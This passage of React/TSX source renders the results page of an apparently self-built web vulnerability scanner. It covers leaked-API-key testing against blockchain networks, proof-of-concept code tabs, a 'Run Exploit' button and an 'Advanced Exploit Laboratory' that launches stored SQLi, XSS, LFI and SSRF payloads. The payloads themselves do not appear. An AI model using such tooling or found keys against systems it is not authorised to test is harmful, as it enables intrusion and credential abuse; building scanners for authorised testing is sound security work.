                                                                                    {apiKeyTests.get(vuln.id)?.status === 'testing' && (
                                                                                        <Loader2 className="inline size-4 mr-2 animate-spin" />
                                                                                    )}
                                                                                    {apiKeyTests.get(vuln.id)?.message}
                                                                                </div>

                                                                                {/* Summary bar */}
                                                                                {apiKeyTests.get(vuln.id)?.status === 'complete' && (
                                                                                    <div className="mb-3 flex gap-4 text-xs">
                                                                                        <span className={darkMode ? 'text-gray-400' : 'text-gray-600'}>
                                                                                            Total: {apiKeyTests.get(vuln.id)?.summary.total}
                                                                                        </span>
                                                                                        <span className="text-green-500 flex items-center gap-1">
                                                                                            <Check className="size-3" />
                                                                                            Enabled: {apiKeyTests.get(vuln.id)?.summary.enabled}
                                                                                        </span>
                                                                                        <span className="text-red-500 flex items-center gap-1">
                                                                                            <X className="size-3" />
                                                                                            Disabled: {apiKeyTests.get(vuln.id)?.summary.disabled}
                                                                                        </span>
                                                                                    </div>
                                                                                )}

                                                                                {/* Network results grid */}
                                                                                <div className="grid grid-cols-2 md:grid-cols-3 gap-2 text-xs">
                                                                                    {apiKeyTests.get(vuln.id)?.networks.map((net, idx) => (
                                                                                        <div
                                                                                            key={idx}
                                                                                            className={`p-2 rounded flex items-center justify-between ${net.enabled
                                                                                                ? (darkMode ? 'bg-green-900/30 border border-green-700/50' : 'bg-green-100 border border-green-300')
                                                                                                : (darkMode ? 'bg-slate-700/50 border border-slate-600' : 'bg-gray-200 border border-gray-300')
                                                                                                }`}
                                                                                        >
                                                                                            <span className={net.enabled ? 'text-green-400 font-medium' : (darkMode ? 'text-gray-500' : 'text-gray-500')}>
                                                                                                {net.name}
                                                                                            </span>
                                                                                            {net.enabled ? (
                                                                                                <span className="text-green-400 flex items-center gap-1">
                                                                                                    <Check className="size-3" />
                                                                                                    {net.blockNumber && <span className="text-xs opacity-70">#{net.blockNumber}</span>}
                                                                                                </span>
                                                                                            ) : (
                                                                                                <X className={`size-3 ${darkMode ? 'text-gray-600' : 'text-gray-400'}`} />
                                                                                            )}
                                                                                        </div>
                                                                                    ))}
                                                                                </div>

                                                                                {/* Retest button */}
                                                                                {apiKeyTests.get(vuln.id)?.status === 'complete' && (
                                                                                    <button
                                                                                        onClick={() => testApiKey(vuln.id, (vuln as any).secretService, (vuln as any).secretValue)}
                                                                                        className={`mt-3 flex items-center gap-2 px-3 py-1 rounded text-xs ${darkMode
                                                                                            ? 'bg-slate-700 hover:bg-slate-600 text-gray-300'
                                                                                            : 'bg-gray-200 hover:bg-gray-300 text-gray-700'
                                                                                            }`}
                                                                                    >
                                                                                        <RefreshCw className="size-3" />
                                                                                        Retest
                                                                                    </button>
                                                                                )}
                                                                            </div>
                                                                        )}

                                                                        {/* Help text */}
                                                                        {!apiKeyTests.get(vuln.id) && (
                                                                            <p className={`text-xs ${darkMode ? 'text-gray-500' : 'text-gray-500'}`}>
                                                                                Test this API key against multiple blockchain networks to verify if it's exploitable or domain-locked.
                                                                            </p>
                                                                        )}
                                                                    </div>
                                                                )}
                                                            </div>
                                                        )}

                                                        {/* Regular evidence display (non-secrets) */}
                                                        {vuln.evidence && !(vuln as any).secretService && (
                                                            <div>
                                                                <h5 className={`text-sm font-medium mb-1 ${darkMode ? 'text-gray-400' : 'text-gray-600'}`}>Evidence</h5>
                                                                <div className={`p-3 rounded font-mono text-xs overflow-x-auto ${darkMode ? 'bg-slate-900 border border-slate-700' : 'bg-gray-100 border border-gray-200'}`}>
                                                                    <div className="whitespace-pre-wrap break-all select-all">
                                                                        {vuln.evidence}
                                                                    </div>
                                                                </div>
                                                                <button
                                                                    onClick={() => copyToClipboard(vuln.evidence || '')}
                                                                    className={`mt-2 text-xs px-2 py-1 rounded ${darkMode ? 'bg-slate-700 hover:bg-slate-600 text-gray-300' : 'bg-gray-200 hover:bg-gray-300 text-gray-700'}`}
                                                                >
                                                                    Copy Evidence
                                                                </button>
                                                            </div>
                                                        )}

                                                        {/* Proof of Concept Generator */}
                                                        {(['xss', 'injection', 'sqli', 'ssrf', 'rce', 'lfi'] as string[]).includes(vuln.category as string) && vuln.url && (
                                                            <div className={`mt-4 pt-4 border-t ${darkMode ? 'border-slate-700' : 'border-gray-200'}`}>
                                                                <div className="flex items-center justify-between mb-3">
                                                                    <h5 className={`text-sm font-medium flex items-center gap-2 ${darkMode ? 'text-gray-200' : 'text-gray-800'}`}>
                                                                        <FlaskConical className="size-4 text-purple-500" />
                                                                        Proof of Concept & Exploit
                                                                    </h5>
                                                                    <div className="flex gap-3">
                                                                        <div className="flex gap-1 bg-gray-100 dark:bg-slate-700 p-0.5 rounded">
                                                                            {(['curl', 'python', 'javascript'] as const).map(lang => (
                                                                                <button
                                                                                    key={lang}
                                                                                    onClick={() => setActivePocTabs(prev => ({ ...prev, [vuln.id]: lang }))}
                                                                                    className={`px-2 py-1 text-xs rounded capitalize transition-all ${(activePocTabs[vuln.id] || 'curl') === lang
                                                                                        ? 'bg-white dark:bg-slate-600 shadow text-indigo-600 dark:text-indigo-400 font-medium'
                                                                                        : 'text-gray-500 dark:text-gray-400 hover:text-gray-700 dark:hover:text-gray-300'
                                                                                        }`}
                                                                                >
                                                                                    {lang}
                                                                                </button>
                                                                            ))}
                                                                        </div>
                                                                    </div>
                                                                </div>

                                                                {(() => {
                                                                    const pocs = generatePoC(vuln);
                                                                    if (!pocs) return <div className="text-xs text-gray-500">Unable to generate PoC for this finding.</div>;

                                                                    const activeLang = activePocTabs[vuln.id] || 'curl';
                                                                    const code = pocs[activeLang];

                                                                    return (
                                                                        <div className="space-y-4">
                                                                            {/* Running status and analysis */}
                                                                            {exploitTests.get(vuln.id) && (
                                                                                <div className={`p-3 rounded-lg border-2 ${exploitTests.get(vuln.id)?.status === 'running'
                                                                                    ? 'bg-blue-500/10 border-blue-500/30 text-blue-400'
                                                                                    : exploitTests.get(vuln.id)?.verified
                                                                                        ? 'bg-red-500/10 border-red-500/30 text-red-400'
                                                                                        : 'bg-green-500/10 border-green-500/30 text-green-400'
                                                                                    }`}>
                                                                                    <div className="flex items-center justify-between">
                                                                                        <div className="flex items-center gap-2">
                                                                                            {exploitTests.get(vuln.id)?.status === 'running' && <Loader2 className="size-4 animate-spin" />}
                                                                                            <span className="font-bold">{exploitTests.get(vuln.id)?.message}</span>
                                                                                        </div>
                                                                                        {exploitTests.get(vuln.id)?.verified && (
                                                                                            <span className="bg-red-500 text-white px-2 py-0.5 rounded shadow-sm font-bold text-xs uppercase animate-pulse">
                                                                                                Verified Vulnerable
                                                                                            </span>
                                                                                        )}
                                                                                    </div>
                                                                                </div>
                                                                            )}

                                                                            <div className="flex gap-4">
                                                                                <div className="flex-1 relative group">
                                                                                    <div className={`p-3 rounded font-mono text-xs overflow-x-auto ${darkMode ? 'bg-slate-900 border border-slate-700' : 'bg-gray-100 border border-gray-200'}`}>
                                                                                        <pre className="whitespace-pre-wrap break-all select-all">
                                                                                            {code}
                                                                                        </pre>
                                                                                    </div>
                                                                                    <button
                                                                                        onClick={() => copyToClipboard(code)}
                                                                                        className={`absolute top-2 right-2 p-1.5 rounded opacity-0 group-hover:opacity-100 transition-opacity ${darkMode ? 'bg-slate-700 hover:bg-slate-600 text-gray-300' : 'bg-white hover:bg-gray-50 text-gray-700 shadow-sm border'
                                                                                            }`}
                                                                                        title="Copy Code"
                                                                                    >
                                                                                        <Copy className="size-3" />
                                                                                    </button>
                                                                                </div>

                                                                                <div className="shrink-0">
                                                                                    <button
                                                                                        onClick={() => runExploitTest(vuln)}
                                                                                        disabled={exploitTests.get(vuln.id)?.status === 'running'}
                                                                                        className={`group flex flex-col items-center justify-center gap-2 px-6 py-4 rounded-xl font-bold transition-all border-2 h-full min-w-[120px] ${exploitTests.get(vuln.id)?.status === 'running'
                                                                                            ? 'bg-slate-800 border-slate-700 text-gray-500 cursor-not-allowed'
                                                                                            : (exploitTests.get(vuln.id)?.verified
                                                                                                ? 'bg-red-600 border-red-500 text-white hover:bg-red-500'
                                                                                                : 'bg-indigo-600/10 border-indigo-500 text-indigo-400 hover:bg-indigo-600 hover:text-white shadow-lg')
                                                                                            }`}
                                                                                    >
                                                                                        {exploitTests.get(vuln.id)?.status === 'running' ? (
                                                                                            <Loader2 className="size-6 animate-spin" />
                                                                                        ) : (
                                                                                            <Zap className={`size-6 ${exploitTests.get(vuln.id)?.verified ? 'text-white' : 'text-indigo-400 group-hover:text-white'}`} />
                                                                                        )}
                                                                                        <div className="text-[10px] uppercase tracking-wider">Run Exploit</div>
                                                                                    </button>
                                                                                </div>
                                                                            </div>

                                                                            {/* Exploit details */}
                                                                            {exploitTests.get(vuln.id)?.response && (
                                                                                <div className="mt-4">
                                                                                    <h5 className={`text-xs font-medium mb-1 ${darkMode ? 'text-gray-400' : 'text-gray-600'}`}>Live Response Analysis</h5>
                                                                                    <div className={`p-3 rounded font-mono text-[10px] overflow-y-auto max-h-48 whitespace-pre-wrap ${darkMode ? 'bg-slate-900 border border-slate-700 text-gray-400' : 'bg-gray-50 border border-gray-200 text-gray-600'}`}>
                                                                                        {exploitTests.get(vuln.id)?.response?.body.substring(0, 5000)}
                                                                                    </div>
                                                                                </div>
                                                                            )}

                                                                            {/* Advanced Exploit Lab (Final Results) */}
                                                                            {(() => {
                                                                                const catMap: Record<string, string> = { 'injection': 'sqli', 'sqli': 'sqli', 'xss': 'xss', 'lfi': 'lfi', 'path-traversal': 'lfi', 'rce': 'lfi', 'ssrf': 'ssrf' };
                                                                                const labCat = catMap[vuln.category as string];
                                                                                const labPayloads = labCat ? (EXPLOIT_LAB_LIBRARY as any)[labCat] : null;

                                                                                if (!labPayloads) return null;

                                                                                return (
                                                                                    <div className="mt-6 p-4 rounded-xl border border-dashed border-purple-500/30 bg-purple-500/5">
                                                                                        <div className="flex items-center gap-2 mb-4">
                                                                                            <FlaskConical className="size-5 text-purple-400" />
                                                                                            <div>
                                                                                                <h4 className="text-sm font-bold text-gray-200">Advanced Exploit Laboratory</h4>
                                                                                                <p className="text-[10px] text-gray-500">Secondary verification payloads for deeper compromise analysis.</p>
                                                                                            </div>
                                                                                        </div>
                                                                                        <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
                                                                                            {labPayloads.map((labVuln: any) => (
                                                                                                <div key={labVuln.name} className={`p-3 rounded-lg border transition-all hover:border-purple-500/50 ${darkMode ? 'bg-slate-900/60 border-slate-800' : 'bg-white border-gray-200 shadow-sm'}`}>
                                                                                                    <div className="flex items-center justify-between mb-2">
                                                                                                        <span className="text-[11px] font-bold text-purple-400">{labVuln.name}</span>
                                                                                                        <button
                                                                                                            disabled={exploitTests.get(vuln.id)?.status === 'running'}
                                                                                                            onClick={() => {
                                                                                                                const p = labVuln.payloads;
                                                                                                                const payload = p.altoro || p.mysql || p.script || p.linux || p.aws || Object.values(p)[0];
                                                                                                                runExploitTest(vuln, payload as string);
                                                                                                            }}
                                                                                                            className="text-[10px] font-bold bg-purple-600 hover:bg-purple-500 text-white px-3 py-1 rounded-md transition-all shadow-lg shadow-purple-900/20"
                                                                                                        >
                                                                                                            LAUNCH
                                                                                                        </button>
                                                                                                    </div>
                                                                                                    <p className={`text-[10px] leading-relaxed ${darkMode ? 'text-gray-400' : 'text-gray-600'}`}>
                                                                                                        {labVuln.description}
                                                                                                    </p>
                                                                                                </div>
                                                                                            ))}
                                                                                        </div>
                                                                                    </div>
                                                                                );
                                                                            })()}
                                                                        </div>
                                                                    );
                                                                })()}
                                                            </div>
                                                        )}

                                                        {vuln.contractAddress && (
                                                            <div>
                                                                <h5 className={`text-sm font-medium mb-1 ${darkMode ? 'text-gray-400' : 'text-gray-600'}`}>Contract</h5>
                                                                <div className="flex items-center gap-2">
                                                                    <code className={`text-xs ${darkMode ? 'text-cyan-400' : 'text-cyan-600'}`}>
                                                                        {vuln.contractAddress}
                                                                    </code>
                                                                    <button
                                                                        onClick={() => copyToClipboard(vuln.contractAddress!)}
                                                                        className="p-1 hover:bg-slate-700 rounded"
                                                                    >
                                                                        <Copy className="size-3" />
                                                                    </button>
                                                                    {vuln.chain && (
                                                                        <span className={`text-xs ${darkMode ? 'text-gray-500' : 'text-gray-500'}`}>
                                                                            ({vuln.chain})
                                                                        </span>
                                                                    )}
                                                                </div>
                                                            </div>
                                                        )}

                                                        <div>
                                                            <h5 className={`text-sm font-medium mb-1 ${darkMode ? 'text-gray-400' : 'text-gray-600'}`}>Recommendation</h5>
                                                            <p className={`text-sm ${darkMode ? 'text-gray-300' : 'text-gray-700'}`}>{vuln.recommendation}</p>
                                                        </div>

                                                        {vuln.attackVector && (
                                                            <div className={`inline-flex items-center gap-2 px-3 py-1.5 rounded ${darkMode ? 'bg-red-500/10 text-red-400' : 'bg-red-50 text-red-600'}`}>
                                                                <AlertTriangle className="size-4" />
                                                                <span className="text-sm font-medium">Attack Vector: {vuln.attackVector}</span>
                                                            </div>
                                                        )}
                                                    </div>
                                                </div>
                                            )}
                                        </div>
                                    ))}

                                    {filteredVulns.length === 0 && (
                                        <div className={`text-center py-8 ${darkMode ? 'text-gray-500' : 'text-gray-400'}`}>
                                            {result.vulnerabilities.length === 0
                                                ? 'No vulnerabilities found!'
                                                : 'No vulnerabilities match the current filter.'}
                                        </div>
                                    )}
                                </div>

                            </>
                        )}

                        {/* Scan Info */}
                        <div className={`mt-6 p-4 rounded-lg ${darkMode ? 'bg-slate-800/50' : 'bg-gray-50'}`}>
                            <div className={`text-sm ${darkMode ? 'text-gray-500' : 'text-gray-500'}`}>
                                Scan completed in {result.duration ? (result.duration / 1000).toFixed(1) : '?'}s
                                {' • '}
                                {result.endTime?.toLocaleString()}
                            </div>
                        </div>
                    </div>
                )
            }

            {/* Empty State */}
            {
                !isScanning && !result && (
                    <div className="flex-1 flex items-center justify-center p-8">
                        <div className="text-center max-w-md">
                            <div className={`inline-flex p-4 rounded-full mb-4 ${darkMode ? 'bg-slate-800' : 'bg-gray-100'}`}>
                                <Shield className="size-12 text-cyan-400" />
                            </div>
                            <h3 className="text-xl font-bold mb-2">STRIX Web Scanner</h3>
                            <p className={`${darkMode ? 'text-gray-400' : 'text-gray-600'}`}>
                                Enter a URL above to scan for vulnerabilities. STRIX will check for:
                            </p>
                            <div className="grid grid-cols-2 gap-2 mt-4 text-sm">
                                <div className={`p-2 rounded ${darkMode ? 'bg-slate-800' : 'bg-gray-100'}`}>
                                    <Code className="size-4 mx-auto mb-1 text-orange-400" />
                                    XSS & Injection
                                </div>
                                <div className={`p-2 rounded ${darkMode ? 'bg-slate-800' : 'bg-gray-100'}`}>
                                    <Server className="size-4 mx-auto mb-1 text-blue-400" />
                                    Security Headers
                                </div>
                                <div className={`p-2 rounded ${darkMode ? 'bg-slate-800' : 'bg-gray-100'}`}>
                                    <Wallet className="size-4 mx-auto mb-1 text-purple-400" />
                                    Web3/Blockchain
                                </div>
                                <div className={`p-2 rounded ${darkMode ? 'bg-slate-800' : 'bg-gray-100'}`}>
                                    <Lock className="size-4 mx-auto mb-1 text-green-400" />
                                    Auth & CSRF
                                </div>
                            </div>
                        </div>
                    </div>
                )
            }
        </div >
    );
}
